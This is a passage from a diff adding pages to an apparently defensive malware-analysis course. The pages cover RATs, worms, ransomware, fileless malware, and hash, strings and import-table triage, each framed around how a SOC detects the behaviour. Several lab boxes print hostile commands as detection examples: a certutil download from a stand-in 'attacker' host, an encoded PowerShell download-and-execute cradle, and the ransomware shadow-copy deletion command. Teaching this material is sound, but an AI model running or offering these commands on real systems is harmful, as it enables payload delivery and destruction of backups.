+# the listener now drives the victim shell — that is the RAT core, minus the GUI</code></pre><p style="margin-top:8px"><b>You should see:</b> the attacker&#39;s terminal now controls the victim&#39;s shell. Every RAT is this callback plus features. Note the connection is <b>outbound</b> from the victim &mdash; the reason firewalls miss it.</p></div><div class="box key-takeaway"><span class="box-t">The RAT signature</span><p><strong class="hl">Reverse = victim dials out.</strong> That is why RATs use outbound 443/80 and why <em>egress filtering</em> and <em>beacon detection</em> (a steady connection to a rare host) are the controls that catch them &mdash; not the inbound firewall.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Viruses &amp; worms">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P07</span><span class="tag theory">Attack &middot; propagation</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Viruses vs Worms &mdash; Who Needs the Click</h1>
+      <p class="lede">One waits for a human; one does not. That single difference decides how fast an outbreak moves &mdash; and how you contain it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The one distinction that matters</span><p>A <strong>virus attaches</strong> to a host file and spreads only when a user runs that file. A <strong>worm self-propagates</strong> &mdash; it finds the next vulnerable host and infects it directly, no click required. That is why worms cause <em>outbreaks</em> (WannaCry hit 200k hosts in days) while viruses spread at human speed. Watch a worm move.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Worm self-propagation: an infected host scans for the next vulnerable target, exploits it, copies itself, and repeats — exponential spread.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">PATIENT ZERO</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">already infected</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">NEXT VICTIM</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">vulnerable host</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">THE NETWORK</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">hundreds more</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">scan for the vulnerable port (e.g. SMB 445)</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">exploit &amp; copy itself over &mdash; no user click</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <rect x="245" y="206" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="226" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">new victim now runs the worm too</text>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <text x="705" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">each victim scans &amp; infects more &mdash; exponential</text>
+          <path d="M526,282 L884,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: one host connecting to hundreds on one port</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The worm carries a scanner. WannaCry looked for SMBv1 / MS17-010 &mdash; the same flaw you exploited in S5.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>It exploits the host directly (EternalBlue) and writes a copy of itself. This is the step a virus cannot do alone.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The freshly infected host becomes a new patient zero.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>1&rarr;2&rarr;4&rarr;8&hellip; This exponential curve is why a worm can cover a flat network in minutes.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>The propagation IS the detection: a single source touching many destinations on the same port is the classic worm signature. Contain by network segmentation.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; see the propagation signature (safe, no real worm)</span><pre><code># The worm TELL is one host hitting many on one port. Simulate the scan half only:
+nmap -p445 --open 192.168.56.0/24    # one source -> many dests, same port
+# In a SOC this fan-out pattern from a single internal host = worm/lateral-movement alert</code></pre><p style="margin-top:8px"><b>You should see:</b> the fan-out pattern &mdash; one internal source touching many destinations on a single port &mdash; is the network signature of both worm propagation and lateral movement. Segmentation is what stops it.</p></div><div class="box key-takeaway"><span class="box-t">Click or no click</span><p><strong class="hl">Worm = no human needed = outbreak speed.</strong> Contain viruses by stopping execution (user training, app-whitelisting); contain worms by <em>segmentation and patching</em> &mdash; you cannot out-click an exponential curve.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Ransomware">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P08</span><span class="tag theory">Attack &middot; encrypt &amp; extort</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Ransomware &mdash; The Business Model</h1>
+      <p class="lede">The most costly malware class. Watch the encrypt-and-extort flow &mdash; and see why the loud, fast file rewrite is also its weakness.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Malware as a business</span><p>Ransomware is malware with a <strong>revenue model</strong>: encrypt what the victim needs, sell the key back, and &mdash; in modern &quot;double extortion&quot; &mdash; also threaten to leak the stolen copy. It usually arrives via a trojan or a worm, escalates (S6), disables recovery, then encrypts. The encryption is deliberately <em>fast and total</em> &mdash; which is exactly the behaviour a defender can catch.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 424" role="img" aria-label="The ransomware flow: gain access, escalate, delete backups, encrypt files fast, then drop a ransom note and optionally leak data.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">RANSOMWARE</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">on the host</text>
+          <line x1="185" y1="80" x2="185" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">THE FILES</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">victim data</text>
+          <line x1="520" y1="80" x2="520" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">OPERATOR</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">gets paid</text>
+          <line x1="890" y1="80" x2="890" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">1 · foothold &amp; escalate (S5&ndash;S6) &rarr; run as SYSTEM</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">2 · delete shadow copies &amp; backups</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="352" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">3 · encrypt every file, fast</text>
+          <path d="M191,228 L514,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">4 · drop a ransom note in every folder</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:26px">
+          <text x="537" y="322" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">5 · demand payment (+ leak threat)</text>
+          <path d="M884,336 L191,336" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="6" style="--pf-dx:-26px">
+          <rect x="245" y="368" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="388" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: mass file-rewrite + vssadmin = ring the alarm</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>It needs privilege to reach every file and disable defences &mdash; the exact escalation you learned last session.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>vssadmin delete shadows /all. Killing recovery first is what forces the victim to pay. A huge detection opportunity.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Thousands of files read, encrypted, and rewritten (often to a new extension) in seconds. The speed and volume are the tell.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>README_DECRYPT.txt everywhere, wallpaper changed. Now the victim knows.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>Payment for the key, plus a threat to publish the exfiltrated copy. ATT&amp;CK: Impact (TA0040).</div>
+        <div class="pf-cap" data-cap="6"><span class="pf-n">STEP 6</span>A single process touching thousands of files and calling vssadmin is a near-certain ransomware signature. Speed of detection = files saved.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; spot the recovery-kill command (the earliest, loudest tell)</span><pre><code># This one line appears in almost every Windows ransomware sample BEFORE encryption:
+vssadmin.exe delete shadows /all /quiet
+# A Sigma rule on 'vssadmin delete shadows' catches ransomware while files are still intact.</code></pre><p style="margin-top:8px"><b>You should see:</b> the backup-deletion step happens <b>before</b> mass encryption &mdash; so a rule on <span class="mono">vssadmin delete shadows</span> is an early-warning that can save the data. This becomes part of your Lab D rules.</p></div><div class="box key-takeaway"><span class="box-t">Its strength is its weakness</span><p><strong class="hl hl-d">Ransomware is loud on purpose.</strong> It must delete backups and rewrite everything fast &mdash; and that mass, high-speed file activity plus <span class="mono">vssadmin</span> is one of the most catchable behaviours in all of malware. Detect the <em>behaviour</em>, not the family.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Fileless malware">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P09</span><span class="tag theory">Attack &middot; living off the land</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Fileless Malware &mdash; Nothing to Hash</h1>
+      <p class="lede">The class that breaks static analysis: no malicious file on disk, just trusted tools doing untrusted things. Learn where it hides.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why fileless defeats the file-scanner</span><p>Static analysis and AV signatures assume there is a <em>file</em> to examine. Fileless malware removes that assumption: it runs in <strong>memory</strong> using tools already trusted on the box &mdash; PowerShell, <span class="mono">wmic</span>, <span class="mono">rundll32</span>, <span class="mono">mshta</span>, the registry. This is &quot;<strong>living off the land</strong>,&quot; and the binaries it abuses are &quot;LOLbins.&quot; You catch it by <em>behaviour</em>, not by hash. Click each hiding place.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 200" role="img" aria-label="Where fileless malware lives: PowerShell in memory, WMI, the registry, and LOLbins. Click each.">
+          <rect x="360" y="14" width="220" height="40" rx="9" fill="#1f2533" stroke="#e63946"/><text class="d-title" x="470" y="40" text-anchor="middle" font-size="14">no .exe on disk</text>
+          <g class="node" data-node="ps" tabindex="0"><rect x="20" y="86" width="210" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="125" y="108" text-anchor="middle" font-size="12.5">PowerShell in memory</text><text class="d-sub" x="125" y="126" text-anchor="middle">-enc &lt;base64&gt; · IEX</text></g>
+          <g class="node" data-node="wmi" tabindex="0"><rect x="248" y="86" width="210" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="353" y="108" text-anchor="middle" font-size="12.5">WMI</text><text class="d-sub" x="353" y="126" text-anchor="middle">event-sub persistence</text></g>
+          <g class="node" data-node="reg" tabindex="0"><rect x="476" y="86" width="210" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="581" y="108" text-anchor="middle" font-size="12.5">Registry</text><text class="d-sub" x="581" y="126" text-anchor="middle">payload stored in a key</text></g>
+          <g class="node" data-node="lol" tabindex="0"><rect x="704" y="86" width="216" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="812" y="108" text-anchor="middle" font-size="12.5">LOLbins</text><text class="d-sub" x="812" y="126" text-anchor="middle">rundll32 · mshta · regsvr32</text></g>
+          <path d="M430,54 L150,84" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M455,54 L360,84" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M490,54 L575,84" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M515,54 L800,84" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each hiding place &mdash; and note none of them is a file you can scan.</div>
+        <div class="dgm-detail" data-detail="ps"><h5><span class="dd-tag">POWERSHELL</span>The universal fileless engine</h5><p><b><span class="mono">powershell -nop -w hidden -enc &lt;base64&gt;</span></b> downloads and runs a payload straight into memory with <span class="mono">IEX (New-Object Net.WebClient).DownloadString(...)</span>. Nothing touches disk. Detect via <b>Script Block Logging (Event 4104)</b> and the command line itself &mdash; a Word document should never launch encoded PowerShell.</p></div>
+        <div class="dgm-detail" data-detail="wmi"><h5><span class="dd-tag">WMI</span>Persistence with no file</h5><p><b>A WMI permanent event subscription runs code on a trigger (logon, a timer) entirely inside the WMI repository.</b> No autorun key, no service, no file &mdash; a favourite for stealthy persistence. Detect with WMI-activity logging and Sysmon Event IDs 19&ndash;21.</p></div>
+        <div class="dgm-detail" data-detail="reg"><h5><span class="dd-tag">REGISTRY</span>The payload is the data</h5><p><b>The malicious script is stored as data inside a registry value; a tiny loader reads and executes it.</b> The registry is not usually scanned as &quot;a file,&quot; so the payload hides in plain sight. Detect via unusually large registry values and the loader&#39;s command line.</p></div>
+        <div class="dgm-detail" data-detail="lol"><h5><span class="dd-tag">LOLbins</span>Trusted binaries, untrusted use</h5><p><b>Signed Microsoft binaries that can execute remote code:</b> <span class="mono">rundll32</span>, <span class="mono">mshta</span>, <span class="mono">regsvr32</span> (the &quot;Squiblydoo&quot; technique), <span class="mono">certutil</span> (download). AV trusts them, so the malware borrows them. Detect by <em>argument patterns</em> &mdash; the binary is fine, the command line is not (LOLBAS project).</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; prove &quot;trusted binary, untrusted argument&quot; with certutil</span><pre><code># certutil is a signed, trusted Windows binary — attackers use it to DOWNLOAD payloads:
+certutil.exe -urlcache -split -f http://attacker/payload.exe C:\Users\Public\p.exe
+# The binary is legit; the argument is the malware. Detection keys on the command line, not the hash.</code></pre><p style="margin-top:8px"><b>You should see:</b> there is no malicious file to scan &mdash; the &quot;malware&quot; is a legitimate signed tool plus a hostile argument. This is why fileless detection lives in <b>process command-line logging</b>, which you will rule on in Lab D.</p></div><div class="box key-takeaway"><span class="box-t">Behaviour beats hash</span><p><strong class="hl hl-d">You cannot hash what is not on disk.</strong> Fileless malware forces the shift from file-signatures to <em>behavioural</em> detection: command lines, parent-child process trees, script-block logs. Static analysis alone will miss it &mdash; which is why the next block is dynamic analysis.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Two ways to analyse">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P10</span><span class="tag theory">Method &middot; the analyst&#39;s toolkit</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Static vs Dynamic &mdash; Look, Then Detonate</h1>
+      <p class="lede">The two halves of malware analysis. One reads the file without running it; the other runs it and watches. You need both.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The safe order of operations</span><p>Faced with an unknown sample, you always go <strong>static first, dynamic second</strong>. Static analysis is safe &mdash; you never execute the file, so you can learn a lot with zero risk. Dynamic analysis is powerful but dangerous &mdash; you actually run the malware, so it only happens in an <em>isolated sandbox</em>. Click each side.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 210" role="img" aria-label="Static analysis versus dynamic analysis: what each examines and its risk. Click each side.">
+          <g class="node" data-node="sta" tabindex="0"><rect x="40" y="30" width="380" height="150" rx="12" fill="#12241c" stroke="#4ade80"/><text class="d-title" x="230" y="66" text-anchor="middle" font-size="16" fill="#4ade80">STATIC</text><text class="d-sub" x="230" y="92" text-anchor="middle">examine WITHOUT running</text><text class="d-sub" x="230" y="116" text-anchor="middle">hashes · strings · imports · signatures</text><text class="d-sub" x="230" y="140" text-anchor="middle" fill="#4ade80">risk: none &mdash; the file never executes</text><text class="d-sub" x="230" y="160" text-anchor="middle">but: packing/obfuscation can hide the truth</text></g>
+          <g class="node" data-node="dyn" tabindex="0"><rect x="520" y="30" width="380" height="150" rx="12" fill="#241417" stroke="#ff7043"/><text class="d-title" x="710" y="66" text-anchor="middle" font-size="16" fill="#ff7043">DYNAMIC</text><text class="d-sub" x="710" y="92" text-anchor="middle">RUN it and watch</text><text class="d-sub" x="710" y="116" text-anchor="middle">processes · network · files · registry</text><text class="d-sub" x="710" y="140" text-anchor="middle" fill="#ff7043">risk: high &mdash; sandbox + isolation required</text><text class="d-sub" x="710" y="160" text-anchor="middle">but: shows real behaviour packers can&#39;t hide</text></g>
+          <path d="M424,105 L516,105" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+          <text x="470" y="98" text-anchor="middle" font-size="11" class="d-sub">then</text>
+        </svg>
+        <div class="dgm-hint">Click each side for the tools and the trade-off.</div>
+        <div class="dgm-detail" data-detail="sta"><h5><span class="dd-tag">STATIC · SAFE</span>Read the file, never run it</h5><p><b>Hash it (identity + VirusTotal reputation), extract strings (URLs, IPs, commands), read the PE imports (what APIs it calls), check for a packer.</b> Zero execution risk, so it is always step one. Weakness: a <em>packed</em> or encrypted sample reveals little until it unpacks itself at runtime &mdash; which is what dynamic analysis is for.</p></div>
+        <div class="dgm-detail" data-detail="dyn"><h5><span class="dd-tag">DYNAMIC · RISKY</span>Detonate and observe</h5><p><b>Run the sample in an isolated VM and watch what it actually does:</b> processes it spawns (ProcMon), connections it opens (TCPView/Wireshark), files and registry keys it changes. This defeats packing &mdash; the malware must unpack to run, and then you see everything. Weakness: dangerous, and smart malware detects sandboxes and hides. <b>Never run malware outside isolation.</b></p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; do the safe half right now on any file</span><pre><code># Static needs no sandbox — start with identity:
+sha256sum suspicious.bin        # the hash: paste into VirusTotal for reputation
+file suspicious.bin              # what kind of file is it really?
+strings -n 8 suspicious.bin | less   # URLs, IPs, commands in cleartext</code></pre><p style="margin-top:8px"><b>You should see:</b> three commands, zero risk, and you often already know if a file is malicious &mdash; a hash hit on VirusTotal plus a hardcoded C2 URL in the strings is frequently enough. Dynamic analysis then confirms behaviour.</p></div><div class="box key-takeaway"><span class="box-t">Order and safety</span><p><strong class="hl">Static first (free, safe), dynamic second (powerful, isolated).</strong> Static tells you <em>what it is</em>; dynamic tells you <em>what it does</em>. Packing can blind static analysis &mdash; running the sample is what forces the truth out.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Static: identity &amp; reputation">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P11</span><span class="tag tool">Tool &middot; hashes + VirusTotal</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Static Analysis I &mdash; Hash It, Look It Up</h1>
+      <p class="lede">The first thirty seconds of every triage: compute the hash, check the world&#39;s reputation databases. Often you are already done.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Identity before anything else</span><p>Before you read a single string, you <strong>fingerprint</strong> the file with a cryptographic hash. The hash is the sample&#39;s identity: paste it into <strong>VirusTotal</strong> and you inherit the analysis of 70+ AV engines plus everyone who has seen it before. A known-bad hash ends triage in seconds; a never-seen hash tells you it may be targeted or freshly built.</p></div>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">Hashing + VirusTotal &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>A cryptographic hash (MD5/SHA-1/SHA-256) is a fixed fingerprint of the file&#39;s exact bytes; VirusTotal is a free multi-engine reputation and analysis service you query by hash or upload.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To answer &quot;has the world seen this file, and is it known bad?&quot; in seconds &mdash; and to share IOCs (the hash) with your team and threat intel without moving the sample.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Compute the SHA-256, <strong>search VirusTotal by hash first</strong> (searching never uploads &mdash; safer for sensitive samples). Only upload if it is unknown and you accept it becomes public.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code># Linux
+sha256sum sample.bin
+# Windows
+Get-FileHash sample.bin -Algorithm SHA256
+certutil -hashfile sample.bin SHA256
+# then paste the hash into virustotal.com (search, do not upload sensitive files)</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td>VT shows a <b>detection ratio</b> (e.g. 58/72), engine names/family labels, first-seen date, and a behaviour tab. High ratio + a named family = known malware. 0/72 on a never-seen file = suspicious in its own right.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>The hash becomes an <strong>IOC</strong> in your report and a block-list entry; the family label points you at existing write-ups; unknown &rarr; escalate to strings/dynamic.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Hashes are cheap detections but brittle</span> &mdash; one changed byte = a new hash. That is why you <em>also</em> write behavioural rules (YARA/Sigma). Hash blocklists catch commodity malware; behaviour catches the variants.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; fingerprint a file and reason about the ratio</span><pre><code>sha256sum /bin/ls          # any file works for the mechanics
+# imagine VT returns:  3/72  ->  likely false positives, treat with suspicion but not confirmed
+#                     58/72  ->  confirmed known malware, block the hash now
+#                      0/72  ->  never seen: could be brand-new/targeted — go static+dynamic</code></pre><p style="margin-top:8px"><b>You should see:</b> the same tool and the same 20 seconds; the <b>ratio</b> is what you interpret. Note that both a very high and a suspicious file with zero detections are meaningful &mdash; &quot;unknown&quot; is not &quot;safe.&quot;</p></div><div class="box key-takeaway"><span class="box-t">Cheap, fast, first &mdash; but brittle</span><p><strong class="hl">Always hash first.</strong> It is free, safe, and often decisive. But a hash identifies <em>one exact file</em> &mdash; change a byte and it is new. Reputation catches the known; the rest of this session catches the unknown.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Static: strings &amp; imports">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P12</span><span class="tag tool">Tool &middot; strings + PE imports</span><span class="time">&#9201; 8 min</span></div>
+      <h1>Static Analysis II &mdash; Read What the File Carries</h1>
+      <p class="lede">Inside every binary are the URLs it calls, the commands it runs, and the Windows APIs it needs. Learn to read a sample&#39;s intentions.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The binary tells on itself</span><p>Even without running it, a sample leaks intent. <strong>Strings</strong> pulls out human-readable text &mdash; hardcoded C2 URLs, IP addresses, registry keys, commands, ransom-note text. The <strong>PE import table</strong> lists the Windows API functions it links to, which reveals <em>capabilities</em>: import <span class="mono">CryptEncrypt</span> and it can encrypt (ransomware?); import <span class="mono">InternetOpenUrl</span> and it talks to the network.</p></div>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">strings + PE imports &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td><span class="mono">strings</span> extracts printable character sequences from a binary; a PE viewer (PE-bear, PEStudio, Dependency Walker, <span class="mono">pefile</span>) parses the executable header and lists imported DLLs/functions.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To infer what a program <em>can do</em> and <em>who it talks to</em> without executing it &mdash; the safest possible source of intelligence about a sample.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Run strings (both ASCII and Unicode), grep for URLs/IPs/keywords; open the PE and read the <strong>import table</strong> for suspicious API clusters (crypto, network, process injection, persistence).</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>strings -n 8 sample.exe            # ASCII
+strings -e l -n 8 sample.exe       # UTF-16LE (Windows)
+strings sample.exe | grep -Ei 'http|\.exe|reg add|HKCU|[0-9]{1,3}(\.[0-9]{1,3}){3}'
+# imports:
+python3 -c "import pefile,sys;print('\n'.join(i.dll.decode() for i in pefile.PE(sys.argv[1]).DIRECTORY_ENTRY_IMPORT))" sample.exe</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td><b>URLs/IPs</b> &rarr; C2 IOCs. <b>Command strings</b> (<span class="mono">vssadmin</span>, <span class="mono">schtasks</span>, <span class="mono">powershell -enc</span>) &rarr; behaviour. <b>Import clusters</b>: <span class="mono">CryptEncrypt/CryptGenKey</span>=crypto, <span class="mono">VirtualAllocEx/WriteProcessMemory/CreateRemoteThread</span>=injection, <span class="mono">WinExec/URLDownloadToFile</span>=download+run.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>C2 URLs/IPs become network IOCs; suspicious strings become the literals in your <strong>YARA rule</strong> (Lab D); import clusters predict what dynamic analysis will confirm.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Few strings + tiny import table = a packer.</span> A near-empty import table (just <span class="mono">LoadLibrary/GetProcAddress</span>) means the real imports are hidden until runtime &mdash; itself a strong &quot;this is malware&quot; signal that pushes you to dynamic analysis.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; pull intent out of a binary with strings</span><pre><code>strings -n 8 /usr/bin/curl | grep -Ei 'http|://|%s' | head
+# On a real sample you would see hardcoded C2:
+#   http://45.66.12.9/gate.php     <- C2 IOC
+#   vssadmin delete shadows /all   <- ransomware behaviour
+#   SOFTWARE\Microsoft\Windows\CurrentVersion\Run  <- persistence</code></pre><p style="margin-top:8px"><b>You should see:</b> readable strings often hand you the C2 address and the malware&#39;s behaviour for free. On real samples these exact strings become the pattern lines of your YARA rule.</p></div><div class="box key-takeaway"><span class="box-t">Strings for intent, imports for capability</span><p><strong class="hl">Strings tell you who it talks to; imports tell you what it can do.</strong> A near-empty import table is itself a red flag &mdash; it means the sample is <em>packed</em>, and the truth only comes out when you run it.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The safe sandbox">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P13</span><span class="tag tool">Method &middot; isolation first</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Dynamic Analysis 0 &mdash; Build the Blast Chamber</h1>
+      <p class="lede">Before you run a single sample, you build the room you run it in. Get isolation wrong and you infect yourself or your network.</p>
+    </div>
+    <div class="content">
